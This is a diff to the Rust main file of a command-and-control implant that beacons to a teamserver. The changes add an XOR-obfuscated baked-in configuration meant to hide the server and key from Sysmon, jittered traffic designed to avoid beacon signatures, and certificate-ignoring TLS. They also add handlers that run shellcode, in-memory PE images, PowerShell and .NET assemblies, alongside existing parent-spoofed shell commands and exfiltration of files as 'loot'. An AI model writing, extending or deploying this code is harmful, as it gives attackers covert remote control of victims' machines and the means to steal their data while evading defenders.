@@ -1,36 +1,63 @@
 use abraham_common::crypto::{self, ClientHello, Session};
 use abraham_common::frame::open_frames;
-use abraham_common::http::{read_response, write_request};
+use abraham_common::http::{read_response, write_request, HDR_HANDSHAKE, HDR_SESSION};
 use abraham_common::message::{
     self, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
 };
 use abraham_common::profile::Profile;
 use ed25519_dalek::VerifyingKey;
 use sha2::{Digest, Sha256};
-use std::net::IpAddr;
+#[cfg(feature = "lab-args")]
 use std::path::Path;
-use std::sync::Arc;
 use std::time::Duration;
 use tokio::io::{AsyncRead, AsyncWrite};
 use tokio::net::TcpStream;
-use tokio_rustls::rustls::client::danger::{
-    HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
-};
-use tokio_rustls::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
-use tokio_rustls::rustls::{
-    ClientConfig, DigitallySignedStruct, Error as TlsError, SignatureScheme,
-};
-use tokio_rustls::TlsConnector;
 
+mod clr;
 mod driver;
+mod runpe;
+/// Operational configuration baked in at build time (ABRAHAM_EMBED) —
+/// empty arrays in lab builds, which read flags instead (feature
+/// `lab-args`). Keeping the CLI parser feature-gated removes the flag
+/// strings and, more importantly, the command-line surface itself from
+/// operational artifacts: Sysmon EID 1 never sees server, key or
+/// evasion state.
+mod embedded_config {
+    include!(concat!(env!("OUT_DIR"), "/embedded.rs"));
+}
 mod evasion;
+mod execshc;
 mod mapper;
 mod modules;
+mod selfinfo;
 mod vdm;
 
-const CHUNK_SIZE: usize = 60_000;
-const RECONNECT_SECS: u64 = 5;
+use evasion::{note, secure_clear};
 
+const CHUNK_SIZE: usize = 60_000;
+/// Reconnect backoff: starts at MIN after a session that reached the
+/// beacon loop, doubles per consecutive failure up to MAX, with jitter.
+/// A fixed retry interval is a mechanical beacon signature; this keeps
+/// the failure pattern indistinguishable from a polling client.
+const RECONNECT_MIN_SECS: u64 = 5;
+const RECONNECT_MAX_SECS: u64 = 300;
+/// Upper bound for one HTTP request/response exchange. Cover transports
+/// behind proxies (CDN edges, redirectors) may silently drop a connection
+/// while the local socket still reports it established; without a bound
+/// the beacon blocks forever on a read that never returns.
+const POST_TIMEOUT: Duration = Duration::from_secs(30);
+
+/// Everything the beacon loop needs, resolved once at startup from
+/// either the embedded build configuration or (lab builds) the flags.
+struct Config {
+    server: String,
+    key_hex: String,
+    tls_pin_hex: Option<String>,
+    evasion_spec: String,
+    profile: Profile,
+}
+
+#[cfg(feature = "lab-args")]
 fn arg_or(flag: &str, default: &str) -> String {
     let args: Vec<String> = std::env::args().collect();
     args.iter()
@@ -40,6 +67,7 @@ fn arg_or(flag: &str, default: &str) -> String {
         .unwrap_or_else(|| default.to_string())
 }
 
+#[cfg(feature = "lab-args")]
 fn arg_opt(flag: &str) -> Option<String> {
     let args: Vec<String> = std::env::args().collect();
     args.iter()
@@ -48,23 +76,87 @@ fn arg_opt(flag: &str) -> Option<String> {
         .cloned()
 }
 
-fn collect_info() -> RegisterInfo {
+/// Decodes the embedded configuration (see build.rs for the layout:
+/// five length-prefixed fields under a build-random XOR keystream).
+fn decode_embedded() -> Option<Config> {
+    // Every byte is read through `read_volatile`: with LTO the optimizer
+    // would otherwise constant-fold the whole XOR and materialize the
+    // plaintext as a `.rdata` constant, defeating the keystream.
+    let cipher_len = unsafe { std::ptr::read_volatile(&embedded_config::CONFIG_CIPHER.len()) };
+    if cipher_len == 0 {
+        return None;
+    }
+    let cipher_ptr = embedded_config::CONFIG_CIPHER.as_ptr();
+    let key_ptr = embedded_config::CONFIG_KEY.as_ptr();
+    let key_len = embedded_config::CONFIG_KEY.len();
+    let mut plain = vec![0u8; cipher_len];
+    for (i, slot) in plain.iter_mut().enumerate() {
+        let c = unsafe { std::ptr::read_volatile(cipher_ptr.add(i)) };
+        let k = if i < key_len {
+            unsafe { std::ptr::read_volatile(key_ptr.add(i)) }
+        } else {
+            0
+        };
+        *slot = c ^ k;
+    }
+    let mut fields: Vec<String> = Vec::with_capacity(5);
+    let mut offset = 0usize;
+    while offset + 2 <= plain.len() && fields.len() < 5 {
+        let len = u16::from_be_bytes([plain[offset], plain[offset + 1]]) as usize;
+        offset += 2;
+        if offset + len > plain.len() {
+            return None;
+        }
+        fields.push(String::from_utf8_lossy(&plain[offset..offset + len]).into_owned());
+        offset += len;
+    }
+    secure_clear(&mut plain);
+    if fields.len() != 5 {
+        return None;
+    }
+    let profile = if fields[4].is_empty() {
+        Profile::default()
+    } else {
+        Profile::load(&fields[4]).unwrap_or_default()
+    };
+    let tls_pin_hex = if fields[2].is_empty() {
+        None
+    } else {
+        Some(fields[2].clone())
+    };
+    Some(Config {
+        server: fields[0].clone(),
+        key_hex: fields[1].clone(),
+        tls_pin_hex,
+        evasion_spec: fields[3].clone(),
+        profile,
+    })
+}
+
+fn collect_info(session_token: u64) -> RegisterInfo {
     let env = |key: &str| std::env::var(key).unwrap_or_default();
     RegisterInfo {
+        session_token,
         hostname: env("COMPUTERNAME"),
         username: env("USERNAME"),
         domain: env("USERDOMAIN"),
         pid: std::process::id(),
-        ppid: 0,
+        ppid: selfinfo::ppid().unwrap_or(0),
         arch: if cfg!(target_arch = "x86_64") {
             message::ARCH_X64
         } else {
             message::ARCH_ARM64
         },
-        integrity_level: 1,
-        os_build: env("OS"),
+        integrity_level: selfinfo::integrity().unwrap_or(0),
+        os_build: selfinfo::os_build().unwrap_or_default(),
         implant_version: env!("CARGO_PKG_VERSION").to_string(),
     }
+}
+
+/// Beacon timing, updatable at runtime by the SLEEP task.
+struct Timing {
+    secs: u64,
+    jitter: f32,
 }
 
 fn jittered(secs: u64, jitter: f32) -> Duration {
@@ -73,89 +165,50 @@ fn jittered(secs: u64, jitter: f32) -> Duration {
     Duration::from_secs(wait)
 }
 
-/// The outer TLS layer is cover traffic; authenticity comes from the inner
-/// Ed25519-pinned handshake. By default any server certificate is accepted.
-/// When a pin is configured the end-entity certificate DER must hash to it.
-#[derive(Debug)]
-struct PinOrAnyVerifier {
-    pin: Option<[u8; 32]>,
-}
-
-impl ServerCertVerifier for PinOrAnyVerifier {
-    fn verify_server_cert(
-        &self,
-        end_entity: &CertificateDer<'_>,
-        _intermediates: &[CertificateDer<'_>],
-        _server_name: &ServerName<'_>,
-        _ocsp_response: &[u8],
-        _now: UnixTime,
-    ) -> Result<ServerCertVerified, TlsError> {
-        if let Some(expected) = &self.pin {
-            let digest: [u8; 32] = Sha256::digest(end_entity.as_ref()).into();
-            if digest != *expected {
-                return Err(TlsError::General("tls certificate pin mismatch".into()));
-            }
-        }
-        Ok(ServerCertVerified::assertion())
-    }
-
-    fn verify_tls12_signature(
-        &self,
-        message: &[u8],
-        cert: &CertificateDer<'_>,
-        dss: &DigitallySignedStruct,
-    ) -> Result<HandshakeSignatureValid, TlsError> {
-        rustls::crypto::verify_tls12_signature(
-            message,
-            cert,
-            dss,
-            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
-        )
-    }
-
-    fn verify_tls13_signature(
-        &self,
-        message: &[u8],
-        cert: &CertificateDer<'_>,
-        dss: &DigitallySignedStruct,
-    ) -> Result<HandshakeSignatureValid, TlsError> {
-        rustls::crypto::verify_tls13_signature(
-            message,
-            cert,
-            dss,
-            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
-        )
-    }
-
-    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
-        rustls::crypto::ring::default_provider()
-            .signature_verification_algorithms
-            .supported_schemes()
-    }
-}
-
 struct HttpConn<S> {
     stream: S,
     host: String,
     user_agent: String,
+    /// Session token echoed on every POST (X-Session) so the teamserver
+    /// can route the request to this session even when the fronting
+    /// proxy lands it on an origin connection belonging to another
+    /// beacon; the ClientHello POST additionally carries X-Handshake: 1.
+    token: u64,
 }
 
 impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
-    async fn post(&mut self, uri: &str, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
-        write_request(
-            &mut self.stream,
-            "POST",
-            uri,
-            &self.host,
-            &self.user_agent,
-            &body,
-        )
-        .await?;
-        let resp = read_response(&mut self.stream).await?;
-        if resp.status != 200 {
-            anyhow::bail!("server returned http {}", resp.status);
-        }
-        Ok(resp.body)
+    async fn post(&mut self, uri: &str, hello: bool, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
+        // A proxy or middlebox can strand the transport half-open: writes
+        // drain into the local socket buffer while the response read never
+        // completes. Bound every request/response exchange so the beacon
+        // drops the connection and re-links (resuming its session) instead
+        // of going silent for the lifetime of the process.
+        let token = self.token.to_string();
+        let headers: &[(&str, &str)] = if hello {
+            &[(HDR_HANDSHAKE, "1"), (HDR_SESSION, &token)]
+        } else {
+            &[(HDR_SESSION, &token)]
+        };
+        let exchange = async {
+            write_request(
+                &mut self.stream,
+                "POST",
+                uri,
+                &self.host,
+                &self.user_agent,
+                headers,
+                &body,
+            )
+            .await?;
+            let resp = read_response(&mut self.stream).await?;
+            if resp.status != 200 {
+                anyhow::bail!("server returned http {}", resp.status);
+            }
+            Ok(resp.body)
+        };
+        tokio::time::timeout(POST_TIMEOUT, exchange)
+            .await
+            .map_err(|_| anyhow::anyhow!("http exchange timed out"))?
     }
 
     /// Posts one sealed frame and decrypts any frames in the response so the
@@ -168,7 +221,7 @@ impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
         plaintext: &[u8],
     ) -> anyhow::Result<Vec<(u8, Vec<u8>)>> {
         let frame = session.seal(msg_type, plaintext)?;
-        let body = self.post(uri, frame).await?;
+        let body = self.post(uri, false, frame).await?;
         Ok(open_frames(&body, session)?)
     }
 }
@@ -177,36 +230,16 @@ impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
 // no other thread may execute implant code while the session thread sleeps.
 #[tokio::main(flavor = "current_thread")]
 async fn main() -> anyhow::Result<()> {
-    let server = arg_or("--server", "127.0.0.1:8443");
-    let key_hex = arg_or("--key", "");
-    if key_hex.is_empty() {
-        anyhow::bail!(
-            "usage: abraham-implant --server <addr> --key <hex> [--profile <yaml>] [--ua <ua>] [--uri <uri>] [--sleep <secs>] [--jitter <f32>] [--tls-pin <sha256-hex>] [--evasion ekko,ppid]"
-        );
-    }
+    // Silent panics: operational builds (panic=abort) terminate without
+    // printing locations, sources or toolchain paths.
+    std::panic::set_hook(Box::new(|_| {}));
+
+    let config = resolve_config()?;
     let mut public_key = [0u8; 32];
-    hex::decode_to_slice(key_hex.trim(), &mut public_key)?;
+    hex::decode_to_slice(config.key_hex.trim(), &mut public_key)?;
     let identity = VerifyingKey::from_bytes(&public_key)?;
 
-    let mut profile = match arg_opt("--profile") {
-        Some(path) => Profile::load_file(Path::new(&path)).map_err(anyhow::Error::msg)?,
-        None => Profile::default(),
-    };
-    if let Some(ua) = arg_opt("--ua") {
-        profile.user_agent = ua;
-    }
-    if let Some(uri) = arg_opt("--uri") {
-        profile.uris = vec![uri];
-    }
-    let mut sleep_secs: u64 = arg_opt("--sleep")
-        .map(|v| v.parse())
-        .transpose()?
-        .unwrap_or(profile.sleep_secs);
-    let mut jitter: f32 = arg_opt("--jitter")
-        .map(|v| v.parse())
-        .transpose()?
-        .unwrap_or(profile.jitter);
-    let pin = match arg_opt("--tls-pin") {
+    let pin = match &config.tls_pin_hex {
         Some(text) => {
             let mut pin = [0u8; 32];
             hex::decode_to_slice(text.trim(), &mut pin)?;
@@ -214,36 +247,125 @@ async fn main() -> anyhow::Result<()> {
         }
         None => None,
     };
-    let evasion_spec = arg_or("--evasion", "");
+
+    let profile = config.profile.clone();
+    #[cfg(feature = "lab-args")]
+    let profile = {
+        let mut profile = profile;
+        if let Some(ua) = arg_opt("--ua") {
+            profile.user_agent = ua;
+        }
+        if let Some(uri) = arg_opt("--uri") {
+            profile.uris = vec![uri];
+        }
+        profile
+    };
+    // `mut` is only exercised by lab builds (--sleep/--jitter overrides).
+    #[cfg_attr(not(feature = "lab-args"), allow(unused_mut))]
+    let mut timing = Timing {
+        secs: profile.sleep_secs,
+        jitter: profile.jitter,
+    };
+    #[cfg(feature = "lab-args")]
+    if arg_opt("--sleep").is_some() || arg_opt("--jitter").is_some() {
+        timing.secs = arg_opt("--sleep")
+            .map(|v| v.parse::<u64>())
+            .transpose()?
+            .unwrap_or(timing.secs);
+        timing.jitter = arg_opt("--jitter")
+            .map(|v| v.parse::<f32>())
+            .transpose()?
+            .unwrap_or(timing.jitter);
+    }
+
+    let evasion_spec = config.evasion_spec.clone();
     let evasion = if evasion_spec.is_empty() {
         evasion::Evasion::disabled()
     } else {
         let flags = evasion::Flags::parse(&evasion_spec).map_err(anyhow::Error::msg)?;
         let armed = evasion::Evasion::enable(flags).map_err(anyhow::Error::msg)?;
-        eprintln!(
+        note!(
             "[*] evasion armed: sleep={} parent-spoof={}",
-            flags.ekko_sleep, flags.spoofed_parent
+            flags.ekko_sleep,
+            flags.spoofed_parent
         );
         armed
     };
 
+    // Stable across reconnects within this process: the server resumes
+    // the session (id + queue) when the transport dies behind a proxy.
+    let mut beacon = Beacon {
+        token: rand::random(),
+        timing,
+    };
+    let mut backoff = RECONNECT_MIN_SECS;
     loop {
+        let mut linked = false;
         match run(
-            &server,
+            &config.server,
             &identity,
             &profile,
             pin,
             &evasion,
-            &mut sleep_secs,
-            &mut jitter,
+            &mut beacon,
+            &mut linked,
         )
         .await
         {
             Ok(()) => return Ok(()),
-            Err(e) => eprintln!("[!] session ended: {e}; reconnecting in {RECONNECT_SECS}s"),
+            Err(e) => {
+                note!("[!] session ended: {e}; retrying in {backoff}s");
+                let _ = &e;
+            }
         }
-        tokio::time::sleep(Duration::from_secs(RECONNECT_SECS)).await;
+        tokio::time::sleep(jittered(backoff, 0.2)).await;
+        backoff = if linked {
+            RECONNECT_MIN_SECS
+        } else {
+            (backoff * 2).min(RECONNECT_MAX_SECS)
+        };
     }
+}
+
+/// Per-process beacon state that survives transports: the resume token
+/// and the (SLEEP-task adjustable) polling timing.
+struct Beacon {
+    token: u64,
+    timing: Timing,
+}
+
+/// Configuration precedence: CLI flags (lab builds only), then the
+/// embedded build configuration, then fail closed — no localhost
+/// default to silently beacon against.
+fn resolve_config() -> anyhow::Result<Config> {
+    #[cfg(feature = "lab-args")]
+    {
+        let server = arg_or("--server", "");
+        let key_hex = arg_or("--key", "");
+        if !server.is_empty() && !key_hex.is_empty() {
+            let mut profile = match arg_opt("--profile") {
+                Some(path) => Profile::load_file(Path::new(&path)).map_err(anyhow::Error::msg)?,
+                None => Profile::default(),
+            };
+            if let Some(uri) = arg_opt("--uri") {
+                profile.uris = vec![uri];
+            }
+            if let Some(ua) = arg_opt("--ua") {
+                profile.user_agent = ua;
+            }
+            return Ok(Config {
+                server,
+                key_hex,
+                tls_pin_hex: arg_opt("--tls-pin"),
+                evasion_spec: arg_or("--evasion", ""),
+                profile,
+            });
+        }
+    }
+    if let Some(embedded) = decode_embedded() {
+        return Ok(embedded);
+    }
+    anyhow::bail!("no configuration");
 }
 
 async fn run(
@@ -252,51 +374,67 @@ async fn run(
     profile: &Profile,
     pin: Option<[u8; 32]>,
     evasion: &evasion::Evasion,
-    sleep_secs: &mut u64,
-    jitter: &mut f32,
+    beacon: &mut Beacon,
+    linked: &mut bool,
 ) -> anyhow::Result<()> {
     let (host, _port) = addr
         .split_once(':')
         .ok_or_else(|| anyhow::anyhow!("server address must be host:port"))?;
     let tcp = TcpStream::connect(addr).await?;
     tcp.set_nodelay(true)?;
-    let server_name = match host.parse::<IpAddr>() {
-        Ok(ip) => ServerName::IpAddress(ip.into()),
-        Err(_) => ServerName::try_from(host.to_string())?,
-    };
-    let tls_config = ClientConfig::builder()
-        .dangerous()
-        .with_custom_certificate_verifier(Arc::new(PinOrAnyVerifier { pin }))
-        .with_no_client_auth();
-    let connector = TlsConnector::from(Arc::new(tls_config));
-    let tls = connector.connect(server_name, tcp).await?;
+    // Cover TLS via the platform stack (Schannel on Windows): the
+    // handshake fingerprint matches ordinary OS HTTPS traffic. Trust is
+    // not decided here — without a pin any certificate completes the
+    // outer layer and the inner Ed25519 handshake authenticates the
+    // server; with a pin the peer end-entity DER is hashed and enforced
+    // before any protocol bytes go out, so a mismatched certificate
+    // aborts the connection first.
+    let mut tls_builder = native_tls::TlsConnector::builder();
+    tls_builder.danger_accept_invalid_certs(true);
+    tls_builder.danger_accept_invalid_hostnames(true);
+    let connector = tokio_native_tls::TlsConnector::from(tls_builder.build()?);
+    let tls = connector.connect(host, tcp).await?;
+    if let Some(expected) = pin {
+        let cert = tls
+            .get_ref()
+            .peer_certificate()?
+            .ok_or_else(|| anyhow::anyhow!("tls peer sent no certificate"))?;
+        let digest: [u8; 32] = Sha256::digest(cert.to_der()?).into();
+        if digest != expected {
+            anyhow::bail!("tls certificate pin mismatch");
+        }
+    }
     let mut conn = HttpConn {
         stream: tls,
         host: host.to_string(),
         user_agent: profile.user_agent.clone(),
+        token: beacon.token,
     };
 
     let (client_secret, client_hello) = ClientHello::generate();
     let hello_body = conn
-        .post(profile.pick_uri(), client_hello.to_bytes().to_vec())
+        .post(profile.pick_uri(), true, client_hello.to_bytes().to_vec())
         .await?;
     let raw_hello: [u8; crypto::SERVER_HELLO_LEN] = hello_body.as_slice().try_into()?;
     let server_hello = crypto::ServerHello::from_bytes(&raw_hello);
     let mut session = crypto::client_finish(identity, client_secret, &client_hello, &server_hello)?;
 
-    let (mt, body) = Message::Register(collect_info()).encode();
+    let (mt, body) = Message::Register(collect_info(beacon.token)).encode();
     conn.post_frame(profile.pick_uri(), &mut session, mt, &body)
         .await?;
+    // Past REGISTER the beacon loop is live — a later failure is a
+    // mid-session drop, not a startup failure, so backoff resets.
+    *linked = true;
 
     loop {
-        evasion.sleep(jittered(*sleep_secs, *jitter));
+        evasion.sleep(jittered(beacon.timing.secs, beacon.timing.jitter));
         let (mt, body) = Message::TaskPoll.encode();
         let frames = conn
             .post_frame(profile.pick_uri(), &mut session, mt, &body)
             .await?;
 
         let mut pending_upload: Option<(u32, String, Vec<u8>)> = None;
-        for (msg_type, payload) in frames {
+        for (msg_type, mut payload) in frames {
             if msg_type == msg::BATCH_END {
                 break;
             }
@@ -312,8 +450,7 @@ async fn run(
                             profile,
                             evasion,
                             Task { id: task.id, body },
-                            sleep_secs,
-                            jitter,
+                            &mut beacon.timing,
                         )
                         .await?;
                     }
@@ -330,16 +467,56 @@ async fn run(
                 }
                 _ => {}
             }
+            // The decoded task frame (commands, payloads) leaves nothing
+            // behind in the heap once dispatched.
+            secure_clear(&mut payload);
         }
     }
+}
+
+/// Inline budget for task results. One sealed frame carries at most ~64 KiB
+/// of plaintext (u16 length field minus the AEAD tag), so a verbose module
+/// output would fail `seal` and take the transport down with it. Larger
+/// results are split: a short preview goes inline and the full payload
+/// follows as chunked loot, which the server reassembles per task id.
+const RESULT_INLINE_MAX: usize = 48_000;
+const RESULT_PREVIEW_LEN: usize = 1_900;
+
+/// Largest prefix of `data` (up to `cap`) that ends on a UTF-8 boundary:
+/// walk back while the byte after the cut is a continuation byte.
+fn utf8_prefix(data: &[u8], cap: usize) -> usize {
+    let mut end = cap.min(data.len());
+    while end > 0 && end < data.len() && (data[end] & 0xC0) == 0x80 {
+        end -= 1;
+    }
+    end
 }
 
 async fn send_result<S: AsyncRead + AsyncWrite + Unpin>(
     conn: &mut HttpConn<S>,
     session: &mut Session,
     profile: &Profile,
-    result: TaskResult,
+    mut result: TaskResult,
 ) -> anyhow::Result<()> {
+    if result.data.len() > RESULT_INLINE_MAX {
+        let total = result.data.len();
+        let mut preview = result.data[..utf8_prefix(&result.data, RESULT_PREVIEW_LEN)].to_vec();
+        preview.extend_from_slice(
+            format!("\n[...] {total} bytes total; full output follows as chunked loot\n")
+                .as_bytes(),
+        );
+        let inline = TaskResult {
+            id: result.id,
+            status: result.status,
+            data: preview,
+        };
+        let (mt, body) = Message::TaskResult(inline).encode();
+        conn.post_frame(profile.pick_uri(), session, mt, &body)
+            .await?;
+        send_chunks(conn, session, profile, result.id, &result.data).await?;
+        secure_clear(&mut result.data);
+        return Ok(());
+    }
     let (mt, body) = Message::TaskResult(result).encode();
     conn.post_frame(profile.pick_uri(), session, mt, &body)
         .await?;
@@ -376,7 +553,7 @@ async fn send_chunks<S: AsyncRead + AsyncWrite + Unpin>(
             body.extend_from_slice(&session.seal(mt, &encoded)?);
         }
     }
-    conn.post(profile.pick_uri(), body).await?;
+    conn.post(profile.pick_uri(), false, body).await?;
     Ok(())
 }
 
@@ -394,7 +571,7 @@ async fn handle_upload_chunk<S: AsyncRead + AsyncWrite + Unpin>(
     if !chunk.last {
         return Ok(());
     }
-    let Some((task_id, path, data)) = pending.take() else {
+    let Some((task_id, path, mut data)) = pending.take() else {
         return Ok(());
     };
     let (status, message) = match std::fs::write(&path, &data) {
@@ -407,6 +584,7 @@ async fn handle_upload_chunk<S: AsyncRead + AsyncWrite + Unpin>(
             format!("failed to write {path}: {e}"),
         ),
     };
+    secure_clear(&mut data);
     send_result(
         conn,
         session,
@@ -426,12 +604,11 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
     profile: &Profile,
     evasion: &evasion::Evasion,
     task: Task,
-    sleep_secs: &mut u64,
-    jitter: &mut f32,
+    timing: &mut Timing,
 ) -> anyhow::Result<()> {
     match task.body {
         TaskBody::Shell { command } => {
-            let (status, data) = if evasion.spoofed_parent() {
+            let (status, mut data) = if evasion.spoofed_parent() {
                 let (exit, output) = evasion.run_command(&command)?;
                 let status = if exit == 0 {
                     message::STATUS_OK
@@ -457,9 +634,12 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
                     message::STATUS_ERROR
                 };
                 let mut data = output.stdout;
-                data.extend_from_slice(&output.stderr);
+                data.extend(&output.stderr);
                 (status, data)
             };
+            // The command text never outlives its execution.
+            let mut command = command;
+            secure_clear(unsafe { command.as_mut_vec() });
             send_result(
                 conn,
                 session,
@@ -467,16 +647,80 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
                 TaskResult {
                     id: task.id,
                     status,
-                    data,
+                    data: data.clone(),
+                },
+            )
+            .await?;
+            secure_clear(&mut data);
+            Ok(())
+        }
+        TaskBody::Module { name, args } => {
+            let (status, mut data) = match modules::run(&name, &args) {
+                Ok(data) => (message::STATUS_OK, data),
+                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+            };
+            let mut args = args;
+            secure_clear(unsafe { args.as_mut_vec() });
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data: data.clone(),
+                },
+            )
+            .await?;
+            secure_clear(&mut data);
+            Ok(())
+        }
+        TaskBody::RunPe { data, path } => {
+            let mut data = data;
+            let (status, out) = if !data.is_empty() {
+                match runpe::run(&data) {
+                    Ok(code) => (
+                        message::STATUS_OK,
+                        format!("runpe: inline {}B exit={code:#x}", data.len()).into_bytes(),
+                    ),
+                    Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+                }
+            } else if !path.is_empty() {
+                match runpe::run_from_path(&path) {
+                    Ok(code) => (
+                        message::STATUS_OK,
+                        format!("runpe: {path} exit={code:#x} (stage deleted)").into_bytes(),
+                    ),
+                    Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+                }
+            } else {
+                (
+                    message::STATUS_ERROR,
+                    b"runpe requires data or path".to_vec(),
+                )
+            };
+            secure_clear(&mut data);
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data: out,
                 },
             )
             .await
         }
-        TaskBody::Module { name, args } => {
-            let (status, data) = match modules::run(&name, &args) {
-                Ok(data) => (message::STATUS_OK, data),
+        TaskBody::PowerShell { script, bootstrap } => {
+            let mut bootstrap = bootstrap;
+            let mut script = script;
+            let (status, out) = match clr::powershell_run(&script, &bootstrap) {
+                Ok(out) => (message::STATUS_OK, out),
                 Err(e) => (message::STATUS_ERROR, e.into_bytes()),
             };
+            secure_clear(unsafe { script.as_mut_vec() });
+            secure_clear(&mut bootstrap);
             send_result(
                 conn,
                 session,
@@ -484,7 +728,56 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
                 TaskResult {
                     id: task.id,
                     status,
-                    data,
+                    data: out,
+                },
+            )
+            .await
+        }
+        TaskBody::ExecuteAssembly {
+            data,
+            type_name,
+            method_name,
+            argument,
+            patch,
+        } => {
+            let mut data = data;
+            let (status, out) =
+                match clr::exec_assembly(&data, &type_name, &method_name, &argument, patch != 0) {
+                    Ok(out) => (message::STATUS_OK, out),
+                    Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+                };
+            secure_clear(&mut data);
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data: out,
+                },
+            )
+            .await
+        }
+        TaskBody::Execute { data } => {
+            let mut data = data;
+            let len = data.len();
+            let (status, out) = match execshc::run(&data) {
+                Ok(ret) => (
+                    message::STATUS_OK,
+                    format!("exec: {len}B ret={ret:#x}").into_bytes(),
+                ),
+                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+            };
+            secure_clear(&mut data);
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data: out,
                 },
             )
             .await
@@ -517,8 +810,9 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
             // std::fs for the same single-thread reason as shell tasks:
             // tokio::fs hops to the blocking pool, which must never run
             // implant code mid-ekko-window.
-            let data = std::fs::read(&path)?;
+            let mut data = std::fs::read(&path)?;
             send_chunks(conn, session, profile, task.id, &data).await?;
+            secure_clear(&mut data);
             send_result(
                 conn,
                 session,
@@ -532,8 +826,8 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
             .await
         }
         TaskBody::Sleep { secs, jitter: j } => {
-            *sleep_secs = secs;
-            *jitter = j;
+            timing.secs = secs;
+            timing.jitter = j;
             send_result(
                 conn,
                 session,
